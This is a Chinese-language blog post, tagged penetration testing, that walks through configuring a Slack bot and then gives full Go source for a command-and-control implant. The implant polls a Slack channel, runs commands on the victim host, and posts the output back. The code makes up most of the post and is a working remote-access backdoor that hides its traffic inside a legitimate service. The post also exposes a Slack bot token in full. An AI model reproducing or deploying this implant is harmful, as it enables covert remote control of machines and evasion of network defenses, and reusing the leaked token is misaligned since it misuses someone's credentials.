---
title: "Slack Golang C2"
date: 2020-10-03T23:57:50+08:00
draft: false
tags:
- go
- c2
- Slack
series:
-
categories:
- 渗透测试
---


最近在学golang，恰好看到demon分析的golang slack c2，便想着自己也来写一写。
<!--more-->

# 配置slack
注册账号什么的就不说了。访问 https://api.slack.com/ 点击 `Start Building`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/dc3e5b61-4384-6b3c-0bf6-3c850bcd4716.png)

创建一个app
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ea267bba-e73e-0625-3680-b40a02c7c70f.png)

左侧`OAuth & Permissions` -> `Scopes` 配置token权限，暂时先配置两个，之后用哪个再加。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/aea99b7f-6fed-a6f8-079b-bf48c2667ac6.png)

然后往上翻点`Install App to Workspace`

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/697544f1-e014-6fb9-8504-173932481567.png)

点allow，然后会自动跳转到token界面，记住这个token。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/84e2a010-7c5f-0bfa-9a48-970282378400.png)

```text
xoxb-1413293450689-1403506559507-aWLcahb6cGLZWGHF61QPV17S
```
创建一个channel
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/fade1c37-c2f2-2a59-4786-b8bdd3ed7f9b.png)


记住你的channel链接`https://app.slack.com/client/T01C58MD8L9/C01BS6GEUJH`中的`C01BS6GEUJH`
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/eb1412aa-4741-2fcd-e50f-9ab3f5117882.png)

通过 `/invite @myslackbot`把bot加到频道里。

然后在`https://api.slack.com/methods`是操作bot的所有api，先用`https://api.slack.com/methods/conversations.history/test`测试下获取聊天记录

配置好token和channel ID
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5281e9f3-f145-d07d-e334-367dc2fd3bc9.png)

点test之后获取到聊天记录
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/cd6fd11a-84fa-eb73-a34b-4baa8f4d36b1.png)


![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b68b1d1c-37b9-40f9-e99a-82cefdd50251.png)

简单的流程知道了，接下来通过golang来操作api，以及编写我们的C2。

# golang编写

```golang
package main

import (
	"fmt"
	"github.com/tidwall/gjson"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	History_api = "https://slack.com/api/conversations.history"
	PostMessage = "https://slack.com/api/chat.postMessage"
	Token       = "xoxb-1413293450689-1403506559507-aWLcahb6cGLZWGHF61QPV17S"
	Channel     = "C01BS6GEUJH"
)

func main() {
	for true {
		time.Sleep(time.Second * 10)
		result := getHistory()
		if strings.HasPrefix(result.Str, "shell") {
			cmdRes := ExecCommand(strings.Split(result.Str, " ")[1])
			putRes(cmdRes)
		} else if strings.HasPrefix(result.Str, "exit") {
			os.Exit(0)
		} else {
			fmt.Println("no command")
		}
	}
}

func getHistory() (result gjson.Result) {
	req, err := http.NewRequest("GET", History_api, nil)
	if err != nil {
		return gjson.Result{}
	}
	q := req.URL.Query()
	q.Add("token", Token)
	q.Add("channel", Channel)
	q.Add("pretty", "1")
	q.Add("limit", "1")
	req.URL.RawQuery = q.Encode()

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return gjson.Result{}
	}
	defer resp.Body.Close()
	byte, _ := ioutil.ReadAll(resp.Body)
	result = gjson.GetBytes(byte, "messages.0.text")
	return
}

func putRes(res string) {
	req, err := http.NewRequest("POST", PostMessage, nil)
	if err != nil {
		return
	}
	p := req.URL.Query()
	p.Add("token", Token)
	p.Add("channel", Channel)
	p.Add("pretty", "1")
	p.Add("text", res)
	req.URL.RawQuery = p.Encode()
	resp, err := http.DefaultClient.Do(req)
	defer resp.Body.Close()
	if err != nil {
		return
	}

}

func ExecCommand(command string) (out string) {
	cmd := exec.Command(command)
	o, err := cmd.CombinedOutput()

	if err != nil {
		out = fmt.Sprintf("shell run error: \n%s\n", err)
	} else {
		out = fmt.Sprintf("combined out:\n%s\n", string(o))
	}
	return
}
```

看下效果

{{< bilibili BV1uk4y1C7oP >}}



自己偷偷摸摸实现了很多功能，就不放了，通过slack的API可以做很多事情。


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

